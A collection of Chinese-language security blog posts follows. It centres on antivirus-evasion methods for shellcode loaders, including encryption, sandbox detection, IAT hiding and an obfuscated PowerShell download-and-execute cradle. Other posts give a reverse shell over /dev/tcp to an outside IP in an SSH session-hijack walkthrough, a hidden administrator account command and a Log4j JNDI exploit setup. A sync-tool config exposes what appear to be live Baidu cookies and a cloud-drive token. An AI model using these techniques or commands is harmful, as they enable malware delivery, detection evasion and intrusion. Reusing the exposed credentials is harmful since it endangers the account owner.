kettel\n免杀借鉴\n一个是学习其思想，自己实现并去特征免杀；\n二是改造原有项目，自己查特征、去特征，经过测试也能达到免杀。\n两大流派：\n一是二进制流，利用汇编配合上C++，调用系统底层函数进内核的方式免杀。（杀软如果直接在用户态检测其行为特征会比较困难）\n二是新工具新项目、小众工具流，其主要思想是寻找反病毒厂商未覆盖的方法和工具，一个是寻找新的语言工具和项目，跟厂商比速度。另一个是偏僻语言，用户量小，厂商一直并未发现或者工作重心不在上面。\n杀软常见监控技术\n内存监控、文件监控、邮件监控、网页防护 、行为防护\n杀毒软件常用检测方法：\n通常分为静态特征查杀和动态行为检测(包括沙箱)\n静态特征查杀，基于匹配特征码，与病毒库里面的md5进行比较。\n做法：模糊哈希算法，机器学习跑模型 ， 效果：仅识别已知马）\n绕过：利用myccl工具查找定位复合特征码 或手工（单步查杀找到特征码）\n动态行为检测-沙箱执行可以程序\n做法：hook关键api，监控注册表启动项，系统文件，防止对其修改 绕过： 沙箱检测(检测线程数)，文件重命名检测 延时(类似cobaltstrike的睡眠机制，用钩子在睡眠时间内存权限设置读写，在非睡眠时改回可执行。)  1.熟悉各个杀软的查杀特性\n火绒： 重点基于字符串去查杀， 做法：重点针对函数如regMovememory进行字符串混淆或更换函数\n360： 重点基于函数具体触发的行为去查杀 做法： 延时，沙箱检测，文件重命名检测\nWindows Defender： 重点基于特定位置，特征码去查杀 做法：找特征码去混淆\n针对各个杀软的特点进行自定义加载器  免杀方式：\n  源码免杀，（有源码时） 定位特征码，进行混淆【如内嵌汇编加载、强制类型转换、加花指令、多层跳转、加无效指令、替换/重写API、API伪调用等】或对shellcode进行异或 编码base64，AES加密等\n  无源码免杀，在源码不好修改时，resourceHacker加资源，替换资源、vmp加壳、加签名、PE优化等组合使用\n  白名单exe/dll免杀-如rundll32、msbuild、mshta、cscript等\n  加载器分离免杀\n  简述自定义加载器的实现代码逻辑\n规避网络测绘-\u0026gt;shellcode混淆-\u0026gt;beacon去特征\n   自己编写shellcode远程加载器\n  Winhttp库或window sockets实现http请求（cs使用winInet库） \u0026ndash;\u0026gt; 容易暴露自己C2和文件服务器地址(域前置解决) 对shellcode进行AES动态加密  服务器\n用flask框架，可以使用select多客户端模型 写一个web服务器，获取请求发过来的key值，用key对shellcode进行加密，响应给客户端\n客户端（C++加载器）\n a. 客户端(C++加载器) 每次请求shellcode时随机生成一个key值，通过http请求将key发送到服务器\n b. 服务器使用key对shellcode进行AES加密或shellcode每一位与key进行异或操作，响应给客户端\n c. 客户端(C++加载器)用cryptopp库进行AES解密shellcode，virtualAlloc采用渐进式申请内存空间，使用memcpy拷贝shellcode到内存中，最后调用这个内存地址\n甚至可以将loader是否也可以尝试一下，客户端仅保留下载loader和shellcode的功能\nshellcode生成工具-donut，对Execute-Assembly进一步利用，将exe,dll,vbs,js转成shellcode\nshellcode混淆器-Obfuscator ，xor，aes\nshellcode加载器加载shellcode实现免杀上线，目前可能是使用最多的方法了。\n免杀技术：\n1. 经典技术：\n特征码修改，花指令免杀，加壳免杀，内存免杀，二次编译免杀，分离免杀，资源修改，白名单免杀\n花指令 \u0026mdash;-\u0026gt;杀毒软件本来是在0x00001000到0x00005000处找一个特征码。但因为我们填充了花指令，恶意代码跑到了0x00008000这个位置，就会导致特征码查杀失败，从而达到免杀目的。花指令撰写方法：找到程序的一个全0代码段。\n2. 修改加载器特征\n加载器特征= A「shellcode+硬编码字符串」 + B 「virtualAlloc，virtualProtect函数」\n修改方法：\n 对A进行 base64编码+加密（如xor）(更安全)，  对B插入花指令(无意义代码)， 可以使用HeapAlloc替换virtualAlloc函数\n3. 内存免杀 （可绕过文件扫描）\nshellcode直接加载进内存，对shellcode特征做隐藏处理，绕过内存扫描\n做法： 采用渐进式申请一块内存，最后改为可执行，最后执行时做分离免杀策略\n4. 分离免杀\nshellcode加载器=S_0「shellcode_downloader」+ S_1「run_shellcode」\n通常杀软只检测一个进程的行为，\n做法： 使用windows管道，socket通道\n分离免杀，将shellcode写入到文件中和加载器分离开，在加载器启动执行时再将shellcode从文件当中读取进来。\n5. 修改资源\n杀软会检测文件的描述，版本号，创建日期作为特征检测\n做法： 使用restorator对目标修改资源文件\n6. 隐藏IAT\n杀软检测导入表中是否存在可疑函数\n做法： opt1 调用getProcessAddress获取所需函数地址\nopt2 用汇编从Teb里找到kernel32.dll地址，再从其导出表中获取所需系统函数\n7. 二次编译免杀\n使用msf中的多态编码器shikata_ga_nai\n8. 偏僻语言编写加载器 如nim\n如 python反序列化加载python加载器（已失效）\n9. 系统函数白名单免杀-uuid方式（已失效)\n利用系统函数UuidFromStringA( payload的uuid数组 ) 转化为shellcode加载进内存，\n调用EnumSystemLocalesA(shellcode首地址 )\n已有项目实现guid免杀\n10. cs中更换beacon.dll，dnsb.dll等\nhttps://mp.weixin.qq.com/s/rEm17yOwX73vh7lcVESM8A windows下免杀思路分享\n11. powershell绕过\n``powershell -c \u0026ldquo;IEX(New-Object Net.WebClient).DownloadString(\u0026lsquo;http://xxx.xxx.xxx/a')\"`\n`  powershell混淆绕过 \u0026ndash; 根据powershell语言特性，字符串转换，变量转换，编码，压缩等\n修改加载器的特征\n 对func_get_delegate_type，func_get_proc_address两个函数重命名替换，对函数里面的一些变量进行重新定义\n重命名$DoIt为$aaaa\n修改IEX为I`EX\n修改Invoke为Inv\u0026rsquo;+\u0026lsquo;oke\n替换$var_code为$acode\n   msf与cs的stager对比分析\n 相同点： 通过WinInet系列函数远程加载stage并使用VirtualAlloc为其分配一块rwx的内存空间，最后转去执行stage\t 不同点： cs比msf多调用几个函数 InternetErrorDlg, GetDesktopWindow, GetLastError\n  payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)\nmeterpreter加载顺序：stager-\u0026gt;metsrv.dll-\u0026gt;stdapi.dll\ncs-beacon加载顺序： stgaer-\u0026gt;beacon.dll\n  C2实现方式：\n meterpreter的handler实现：TCPServer结合resources实现的简易HTTP服务 Beacon的Listener实现：基于NanoHTTPD实现(成熟稳定)    通信协议上差异：\ncs和msf均使用http/s进行数据通信，但具体传输方式上有差异\n- meterpreter使用HTTP 1.1 ，默认使用keep-alive功能，且不能关闭 （不稳定）\n- Beacon使用HTTP 1.1 ，但默认不开启keep-alive功能 且支持抖动特性\n具体的表现为在实际使用过程中,Meterpreter与C2服务器始终保持一条TCP连接,且对TCP连接的状态没有监控. 相对应的Beacon在请求任务/返回结果时会与C2建立连接,而在sleep阶段与C2没有网络连接.\n ETL： 数据抽取-转换-加载的过程  数据抽取： 不同数据库\n数据清洗：\n不完整的数据\n错误数据\n重复数据\n数据转换： 不一致数据转换 数据粒度的转换 商务规则的计算   ","description":"","id":39,"section":"en","tags":null,"title":"免杀专题思考","uri":"http://crkmythical.github.io/en/blog/%E5%85%8D%E6%9D%80%E4%B8%93%E9%A2%98%E6%80%9D%E8%80%83/"},{"content":"编写进度\n   CDN简介 什么是CDN 将web服务器的静态资源(HTML页面、js文件、css文件)及媒体文件(image,video,audio)缓存到CDN节点上，加快网站的响应速度。\n假设您的加速域名为www.a.com，接入CDN开始加速服务后，当终端用户在北京发起HTTP请求时，处理流程如下图所示。\n  当终端用户向www.a.com下的指定资源发起请求时，首先向LDNS（本地DNS）发起域名解析请求。\n  LDNS检查缓存中是否有www.a.com的IP地址记录。\n如果有，则直接返回给终端用户；\n如果没有，则向授权DNS查询。\n  当授权DNS解析www.a.com时，返回域名CNAME www.a.tbcdn.com对应IP地址。\n  域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点IP地址。\n  LDNS获取DNS返回的解析IP地址。\n  用户获取解析IP地址。\n  用户向获取的IP地址发起对该资源的访问请求。\n 如果该IP地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如图中步骤7和8，此时请求结束。 如果该IP地址对应的节点未缓存该资源，则节点向源站发起对该资源的请求。获取资源后结合用户自定义配置的缓存策略，将资源缓存到CDN节点并返回给用户，例如图中的北京节点，此时请求结束。    常见CDN提供商  阿里云CDN 腾讯云CDN Cloudflare等  CDN判断与绕过 判断网站是否使用CDN  通过 http://ping.chinaz.com/ 判断网站响应IP数量判断使用CDN   dig www.example.com A  nslookup www.example.com https://www.cdnplanet.com/tools/cdnfinder  CDN绕过方法 1. 子域名绕过 主域名：example.com IP: 192.168.1.2\n源站(www.example.com )IP：192.168.1.2\n子域名 sub.example.com IP可能性：\n 192.168.1.2 同源站 192.168.1.3-254 同网段 非192.168.1.*的其他IP （子域名绕过不可用)  2. 邮件服务器 CDN加速通过配置DNS的CNAME记录实现\n邮件服务器通过DNS的MX记录实现，一般邮件服务器即目标源IP\n查看对方邮件原文\n3. 国外地址请求 https://get-site-ip.com/ 鉴于CDN服务费用，一般仅国内加速\n4. phpinfo页面 5. 网络空间引擎搜索特定字符串[md5] 6. DNS历史记录 获取CDN后如何绑定指向源站IP 修改本地hosts文件\n","description":"","id":40,"section":"en","tags":null,"title":"绕过CDN查找IP","uri":"http://crkmythical.github.io/en/blog/%E7%BB%95%E8%BF%87cdn%E6%9F%A5%E6%89%BEip/"},{"content":"编写进度\n   建站类型 网站URL结构： [协议]:[域名/IP]:[端口]/[URI]\n可根据 [域名/IP] [端口] [URI] 的不同搭建不同网站\n域名型-根据 域名/IP 不同搭建的web   域名\n  后缀不同 A\nexample.com A 192.168.1.100\nexample.org A 192.168.1.100/192.168.1.200/10.1.2.250\n  前缀不同\nwww.example.com A 192.168.1.200\nbbs.example.com A 10.1.2.250\n  DNS的CNAME记录\nexample.com CNAME example.cyduncdn.com\n    IP\n192.168.1.2\n192.168.1.3-254\n  端口型-根据 端口 不同搭建的Web example.com:8080\nexample.com:8081\n目录型-根据 URI 不同搭建的web example.com/phpstudy/\nexample.com/xss-lab/\n旁注和C段 旁注- 同服务器不同站点\nC段-同网段不同服务器不同站点\n","description":"","id":41,"section":"en","tags":[""],"title":"网站架构","uri":"http://crkmythical.github.io/en/blog/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84/"},{"content":"编写进度\n   防锁屏.vbe Dim wshShell Set wshShell = CreateObject(\u0026quot;Wscript.Shell\u0026quot;) msgbox \u0026quot;µã»÷È·¶¨ºó£¬¿ªÊ¼¶¨Ê±Ä£Äâ¼üÅÌÊäÈë£¬ÒÔ·ÀÖ¹ËøÆÁ¡£Òª½áÊøÄ£ÄâÔòÔËÐÐ ½áÊø.bat\u0026quot; Do While 2\u0026gt;1 wscript.Sleep 60000 wshShell.SendKeys \u0026quot;{NumLock}\u0026quot; wshShell.SendKeys \u0026quot;{NumLock}\u0026quot; Loop 结束锁屏脚本 taskkill /f /im wscript.exe s\n","description":"","id":42,"section":"en","tags":null,"title":"win防锁屏小脚本","uri":"http://crkmythical.github.io/en/blog/win%E9%98%B2%E9%94%81%E5%B1%8F%E5%B0%8F%E8%84%9A%E6%9C%AC/"},{"content":"编写进度\n   隐藏账户排查\n隐藏账户排查 创建隐藏账户 用户名$ 方式创建的用户，使用net user方式查看不到\n参考 隐藏账户创建\nD盾可查到\n1  net user test$ passwd /add \u0026amp;\u0026amp; net localgroup administrators test$ /add   排查隐藏账户-lusrmgr方式 win+R 输入 lusrmgr.msc 打开 本地用户和组，查看是否存在$结尾的账户\n排查隐藏账户-regedit方式 win+R 输入 regedit 打开 注册表编辑器 ，定位到 HKEY_LOCAL_MACHINE/SAM/SAM,右键最后一个 SAM 选择权限 将权限勾选为完全控制，然后确定，关闭注册表编辑器\n最后定位到 HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names查看所有账户\n端口排查  win+R 输入 cmd 运行 netstat -nao 查看异常端口连接找到对应PID win+R 输入 taskmgr 打开任务管理器 点击详细信息查看对应的PID进程信息，右键进程打开文件所在位置，可查看当前进程对应的程序  启动项及计划任务排查  系统启动菜单C:\\Users\\frame\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup win+R 输入 msconfig 打开系统配置，查看启动 win+R 输入 regedit 打开注册表编辑器，查看以下路径是否存在\n{HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER}\\Software\\Microsoft\\Windows\\CurrentVersion\\{Run|RunOnce}  ","description":"","id":43,"section":"en","tags":null,"title":"隐藏账户排查","uri":"http://crkmythical.github.io/en/blog/%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/"},{"content":"编写进度\n   AWVS搭建 1 2  docker pull xrsec/awvs:latest docker run -it -d --name awvs -p 3443:3443 --restart=always xrsec/awvs:latest   访问 https://ip:3443\n账户密码  awvs@awvs.com/Awvs@awvs.com\nNessus 1 2 3 4 5 6  docker pull stevemcgrath/nessus_scanner:latest docker run -dt \\  -e LINKING_KEY={LINKING_KEY}\\  -e SCANNER_NAME={SCANNER_NAME}\\  --name nessus_scanner\\  stevemcgrath/nessus_scanner:latest   AWVS\u0026amp;NESSUS 1 2 3 4 5  docker pull leishianquan/awvs-nessus:v04 docker run -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v04 echo `docker ps -a | grep awvs-nessus` | awk \u0026#39;{print $1}\u0026#39; docker exec –it 容器id /bin/bash /etc/init.d/nessusd start   访问 https://ip:8834/\n用户密码 leishi/leishianquan\nhttps://www.showdoc.com.cn/903737475535911/4808693697997263\n","description":"","id":44,"section":"en","tags":null,"title":"漏扫AWVS-Nessus搭建-docker版","uri":"http://crkmythical.github.io/en/blog/%E6%BC%8F%E6%89%ABawvs-nessus%E6%90%AD%E5%BB%BA-docker%E7%89%88/"},{"content":"编写进度\n   AD小型域环境搭建 参考快速搭建精简的小型域环境\n WinServer 2016 10.211.55.5 (DC) Win7 专业版 10.211.55.6 Win10 专业版 10.211.55.3  在Winserver部署 Active Directory域服务 更改本地DNS指向本机地址 1 2 3 4 5 6 7  # 设置静态ip netsh interface ip set addr \u0026#34;本地连接\u0026#34; static 192.168.0.1 255.255.255.0 192.168.0.254 1 netsh interface ip set dns \u0026#34;本地连接\u0026#34; static 202.103.24.68 netsh interface ip add dns \u0026#34;本地连接\u0026#34; 10.211.55.5 # 设置动态ip netsh interface ip set addr \u0026#34;本地连接\u0026#34; dhcp netsh interface ip set dns \u0026#34;本地连接\u0026#34; dhcp   部署Active Directory域服务 配置Active Directory域服务 ⚠️ 指定与控制功能时，不能选择 只读域控制器(RODC)\n添加域用户  zhangsan qwe@123 lisi qwe@123  验证是否安装成功\n添加域成员机 更改DNS指向域控 10.211.55.5 win7/10 入/出域操作   powershell(管理员)\n打开powershell\n  1 2 3 4  hostname # 查看当前主机名 rename-computer -NewName win10 # win10 更改NetBIOS名 add-computer -domain \u0026#34;域名\u0026#34; -cred \u0026#34;域名\\授权用户\u0026#34; -passthru ;restart-computer remove-computer -credential \u0026#34;域名\\授权用户\u0026#34; -passthru -verbose; restart-computer    win+R 运行 sysdm.cpl  出域\n","description":"","id":45,"section":"en","tags":null,"title":"AD域环境搭建","uri":"http://crkmythical.github.io/en/blog/ad%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"content":"编写进度\n   同步sync 百度云 \u0026mdash;\u0026gt; 阿里云盘 利用yaronzz/BaiduYunToAliYun 即可实现 token/cookie获取\n 阿里云refresh_token获取\n 百度盘cookie获取\n  1 2 3 4  pip3 install b2a --upgrade b2a -a \u0026#34;\u0026lt;ali_refresh_token\u0026gt;\u0026#34; b2a -b \u0026#34;baidu_cookies\u0026#34; b2a -f \u0026#34;/\u0026#34; -t \u0026#34;/BaiDu\u0026#34;   b2a配置文件认证信息 1 2  cat \u0026lt;\u0026lt;EOF \u0026gt; ~/b2a/auth.json {\u0026#34;ali-refresh_token\u0026#34;: \u0026#34;ae253a9107ea420ebfac4eb768142bb5\u0026#34;, \u0026#34;bdy-cookies\u0026#34;: \u0026#34;BIDUPSID=1689F7B461CC0E9C52F12B6BFB6A338F; PSTM=1647073439; PANWEB=1; BAIDUID=1689F7B461CC0E9C52F12B6BFB6A338F:SL=0:NR=10:FG=1; secu=1; BDUSS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; BDUSS_BFESS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; STOKEN=7827cfa835e2d55a9c7a5be98df1e12e685f836295666013c2802f7b3983fa05; SCRC=7a20d4e131f1f62f59df7bf2a44a54c9; RT=\\\u0026#34;z=1\u0026amp;dm=baidu.com\u0026amp;si=tt4cn8zgmy\u0026amp;ss=l1z3c1fp\u0026amp;sl=4\u0026amp;tt=3lm\u0026amp;bcn=https://fclog.baidu.com/log/weirwood?type=perf\u0026amp;ld=6vo\u0026amp;cl=dfu\u0026amp;ul=kf5\u0026amp;hd=kfi\\\u0026#34;; BAIDUID_BFESS=3B52D998848FA0E8B156B63A5126C170:FG=1; csrfToken=gKO-SRJWqAlt7XT9eLasiYy1; BDCLND=NEJdXEDrxfGN7ZPEfNIpeVClSbQ8ESNP; H_PS_PSSID=36175_31660_34812_36167_34584_36122_36277_36125_35864_36226_26350_35724_36102_36061; ndut_fmt=8B0D77DBC872794E85285409CEFEA0CD13623C1299B9CDA79916989D73569A6C; ab_sr=1.0.1_OTFkMTM5NjAxYTY0ZTRiY2M3M2NkODFlMDY0ZjM0YWEyZDIxMDE1MzVmNGUxNmQ0ZGZiZWM5NTk5OWYxZDZmOTU0NjAxNzQxNzczOTJjY2IxYWJhNDE1M2FkYzE0MWJlZjVjOWU3Y2FkMjAzYzU3ZDE1M2Y2Y2NjM2RmY2IzY2Y2OGU4MTYzYjdkNzlhOTFiZGFhZDE0YjEzZjk2ZWUyYQ==; PANPSC=17250608177919035327:CU2JWesajwB3OVK+W4jA5KPTzGELv+1dq7qxW58SMTAwV13IojYjLUci2O0YbEjp7R2km3p1TIG4lUanlzCLQaKK/FH5WUxXYwBzCbaY2H6Ac/axOKu0XZNBoZ8i0CTW8pfgMw2m/oeGDMyMjs7itnzWX47O8AWwA7Z48hYGgW3ajUyYmLmFn1t8VXlRfZV\u0026#34;, \u0026#34;dl-path\u0026#34;: null}   阿里云盘\u0026ndash;\u0026gt;Webdav 阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客 阿里云盘 \u0026ndash;\u0026gt; 本地硬盘 CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com) spinnaker/clouddriver: read and write operations across cloud providers\n阿里云盘\u0026ndash;\u0026gt; 同步盘 修复bug · yxhpy/同步阿里盘 - Gitee.com ","description":"","id":46,"section":"en","tags":null,"title":"关于同步盘的一些方案","uri":"http://crkmythical.github.io/en/blog/%E5%85%B3%E4%BA%8E%E5%90%8C%E6%AD%A5%E7%9B%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%A1%88/"},{"content":"编写进度\n   linux如何添加自定义服务-service命令 添加配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14  cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/systemd/system/clash.service [Unit] Description=Clash service After=network.target [Service] Type=simple User=skylee ExecStart=/usr/bin/clash Restart=on-failure RestartPreventExitStatus=23 [Install] WantedBy=multi-user.target   服务操作 1 2 3  systemctl list-units --type=service # 查看已识别的服务 systemctl daemon-reload # 让系统重新读取服务 service \u0026lt;service-name\u0026gt; start/restart/stop   启/禁用开机自启 1  systemctl enable/disable \u0026lt;service-name\u0026gt;   ","description":"","id":47,"section":"en","tags":null,"title":"linux如何添加自定义服务","uri":"http://crkmythical.github.io/en/blog/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/"},{"content":"编写进度\n   GitHub代码泄露监控快速实践 Code6docker快速部署 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  yum install -y docker git # 安装docker和git git clone git clone https://github.com/4x99/code6.git /opt/code6 ; # 下载code6源码 cd /opt/code6 ; docker build -t code6 . # 构建docker镜像 docker run --name mysqldb -e MYSQL_ROOT_PASSWORD=code6@2022 -d mysql # 启动mysql docker inspect mysqldb | grep IPAddress # 查看数据库容器的内部IP  docker exec -it mysqldb /bin/bash # 进入mysql容器 mysql -h 172.17.0.2 -u root -p code6@2022 # 登录mysql数据库 ALTER USER \u0026#39;root\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;code6@2021\u0026#39;; # 修改mysql数据库密码 create database code6; # 创建code6数据库 FLUSH PRIVILEGES; # 刷新权限 exit; # 退出mysql数据库 docker run -d -p 60080:80 \\  # 启动code6-server容器 -e MYSQL_HOST=172.17.0.2 \\  -e MYSQL_PORT=3306 \\  -e MYSQL_DATABASE=code6 \\  -e MYSQL_USERNAME=root \\  -e MYSQL_PASSWORD=code6@2022 \\  --restart=always \\  --name code6-server code6 docker exec -it code6-server /bin/bash # 进入code6-server容器 php artisan code6:user-list # 查看用户 php artisan code6:user-add sec@upex.co Sec@upex.co2022 # 添加用户   访问 http://:60080 即可\n配置使用 令牌配置 任务配置 ","description":"","id":48,"section":"en","tags":null,"title":"源码监控系统code6搭建","uri":"http://crkmythical.github.io/en/blog/%E6%BA%90%E7%A0%81%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fcode6%E6%90%AD%E5%BB%BA/"},{"content":"编写进度\n   SSH Session复制,实现免密码登录 在evil执行如下操作 监听53端口 1  nc -lvp 53   待 shell反弹后生成完全交互shell 1  python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   3-登录jumpserver 1  ssh jumpserver   本地机器victim操作 0-在本地机器 ./ssh/config文件中添加如下字段 1 2 3  Host * ControlMaster auto ControlPath /tmp/ssh-%r@%h   1-登录jumpserver 1  ssh jumpserver   2-执行反弹shell 1  bash -c \u0026#39;0\u0026lt;\u0026amp;23-;exec 23\u0026lt;\u0026gt;/dev/tcp/101.1x2.34.104/53;sh \u0026lt;\u0026amp;23 \u0026gt;\u0026amp;23 2\u0026gt;\u0026amp;23\u0026#39;   ","description":"","id":49,"section":"en","tags":null,"title":"如何利用ssh-session会话实现免密免key登录jumpserver及利用","uri":"http://crkmythical.github.io/en/blog/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssh-session%E4%BC%9A%E8%AF%9D%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E5%85%8Dkey%E7%99%BB%E5%BD%95jumpserver%E5%8F%8A%E5%88%A9%E7%94%A8/"},{"content":"编写进度\n   ","description":"","id":50,"section":"en","tags":null,"title":"Confluence-CVE2021-26084","uri":"http://crkmythical.github.io/en/blog/confluence-cve2021-26084/"},{"content":"编写进度\n   AWS告警通知与Slack集成  前提：Slack channel中已添加AWS Chatbot应用\n 配置AWS SNS服务 配置AWS Chatbot 第7步配置好SNS服务时再进行第八步\n配置AWS Cloudwatch通知服务 测试告警 FAQ 添加了 频道 ID 后，在AWS Chatbot的Channel中显示不出来频道的名字 需在Slack的频道内添加应用 AWS Chatbot\n通过cloudwatch观察发送记录的日志，报错： Encountered error while sending message to Slack: Slack Web API returned unsuccessful response ( ok: false, error code: channel_not_found, full response body: ChatPostMessageResponse(ok=false, warning=null, error=channel_not_found, needed=null, provided=null, deprecatedArgument=null, responseMetadata=null, channel=null, ts=null, message=null)). 需在Slack的频道内添加应用 AWS Chatbot\n","description":"","id":51,"section":"en","tags":null,"title":"awschatbot_slack集成","uri":"http://crkmythical.github.io/en/blog/awschatbot-slack%E9%9B%86%E6%88%90/"},{"content":"编写进度\n   Apache-Log4j Apache Log4j 远程代码执行\n 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响\n 复线步骤 编译exp-修改Log4jRCE.java 1 2 3 4 5 6 7 8 9 10  public class Log4jRCE { static{ try{ String[] cmd={\u0026#34;open\u0026#34;,\u0026#34;/System/Applications/Calculator.app\u0026#34;}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); }catch (Exception e){ e.printStackTrace(); } } }   python起个本地简易web服务 在target/classes目录下执行 python3 -m http.server 8888\n在本地起一个ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026quot;http://127.0.0.1:8888/#Log4jRCE\u0026quot;\n运行log4j.java程序 临时修复方案： （1）修改jvm参数\n-Dlog4j2.formatMsgNoLookups=true\n（2）修改配置\n在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true\n①在jvm启动参数中添加\n-Dlog4j2.formatMsgNoLookups=true\n③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置log4j2.formatMsgNoLookups=true\nLog4j2 漏洞修复建议\n临时性缓解措施（任选一种，但是注意，只有 \u0026gt;=2.1.0 版本才可以用，老版本不支持这个选项）\n在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true\n系统环境变量中将LOG4J_FORMAT_MSG_NO_LOOKUPS 设置为 true\n创建 log4j2.component.properties 文件，文件中增加配置 log4j2.formatMsgNoLookups=true\n彻底修复漏洞:\n方案一、研发代码修复：升级到官方提供的 log4j-2.15.0-rc2 版本\n方案二、生产环境修复：https://github.com/zhangyoufu/log4j2-without-jndi。（如果不放心网上下载的版本，也可以自己手动解压删除：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 删除jar包里的这个漏洞相关的class，然后重启服务即可）\n长亭检测工具\n","description":"","id":52,"section":"en","tags":null,"title":"Apache_Log4j_RCE","uri":"http://crkmythical.github.io/en/blog/apache-log4j-rce/"},{"content":"编写进度\n   软件供应链安全分析 源代码缺陷  在SDL(Security Development Lifecycle)中的编码阶段产生的缺陷。  产生缺陷的原因  开发人员的经验和能力限制 引入某些开源项目 产品发布前未进行安全测试，仅进行功能测试和性能测试  缺陷的类型 输入验证类 从安全角度来看，一切外部来源的数据均应视为不可信数据 任何输入内容均应在经过严格过滤或验证后，再进行相应的逻辑处理或存储  常见输入验证类缺陷\n SQL注入 XSS LDAP注入 XPath注入 OS命令注入 XML外部实体注入  缺陷成因  输入数据=(特殊字符、编码、数字) =\u0026gt; 注入载体(Payload)\n  Payload= (几乎任何)外部数据源\u0026lt;环境变量、所有类型的用户参数、外部Web服务等\u0026gt;\n 程序未对 输入数据 进行有效验证所导致的缺陷\n防范措施  通用的解决方式 ：对输入进行验证，对输出进行编码\n   输入验证\n 对所有输入明确字符集，如UTF-8 对Request进行数据验证，如数据是否包含超出预期字符，数据范围，数据长度，数据类型    输出编码\n 通过语意输出编码方式，对所有返回到客户端的来自应用程序信任边界之外的数据进行编码，净化所有不可信的数据输出 在基本字符不满足业务规则时，需要对危险字符(\u0026lt;、\u0026gt;、\\、、%、\\、、)进行输出编码，使用特定的安全API    资源管理类  指因程序对内存、文件、流、密码等资源的管理或使用不当而导致的缺陷。  常见资管管理类漏洞\n 缓冲区上益/下溢 资源未释放 内存泄漏 硬编码密码  缺陷成因 内存资源使用不当 内存资源的不当使用通常会导致程序运行破坏、提升权限等危害   缓冲区溢出：\n针对程序设计缺陷，向程序源缓冲区写入使之溢出的内容(超过缓冲区能保存的最大数据量的数据)， 从而破坏程序运行或趁着中断之际获取程序乃至系统的控制权，根据溢出边界不同分为缓冲区上溢和下溢。 越界访问\n当程序访问一个数组中的元素时，如果索引值超过数组的长度，就会导致访问数组之外的内存，出现越界情况。  内存、文件、流等资源管理不当    缺陷名称 定义     内存泄漏 动态申请的内存未进行有效的释放   释放后使用 申请的内存被释放后继续被使用的情况   二次释放 对已经释放后的内存进行重复释放   错误的内存释放对象 释放的对象并非动态分配的内存    密码的管理不当 程序中硬编码会带来敏感信息泄漏、维护困难等问题，弱加密不能有效保护密码  防范措施  对不可信数据进行输入和输出控制。\n在进行内存操作时，检查缓存大小，以确保不会出现超出分配空间大小的风险 在内存、文件、流等资源使用完毕后应正确释放资源\n多次资源分配且未合理释放会耗尽资源，导致拒绝服务攻击 所有进程和线程都应遵循相同的锁定1步骤\n若未严格遵循这些步骤，那么其他进程和线程可以以原始进程不可见或无法预测的方式修改共享资源，导致数据或内存损坏、拒绝服务等 为防范对随机数据的猜测攻击，应当使用加密模块中已验证的随机数生成器生成所有的随机数、随机GUID和随机字符串。保护主要秘密信息免受未授权的访问并使用相关的政策和流程以实现加、解密的密钥管理，使用AES加密算法更安全。同时避免使用硬编码密码的方式存储密码。  代码质量类 指由于代码编写不当所导致的缺陷，低劣的代码质量会导致不可预测行为的发生。  缺陷成因 整数问题 整数分为有符号整数和无符号整数，且有各自的取值范围。当值超出各自的取值范围时会发生回绕  空指针解引用 指针存储的是它指向的变量的地址 解引用就是引用它指向的变量的值  当指针的值为NULL或未初始化时，对其进行解引用，会导致程序异常崩溃或者出现其他未定义的行为。\n初始化问题 根据未初始化变量的位置的不同可分为 - 返回值未初始化 - 参数未初始化 - 赋值未初始化等  变量在使用前应该被初始化，如果没有进行初始化，那该变量默认值时不确定的，使用此默认值可能导致出现未定义的行为\n若此变量时指针类型且没有初始化的情况下进行了解引用，那么会导致空指针解引用\n不当的循环终止 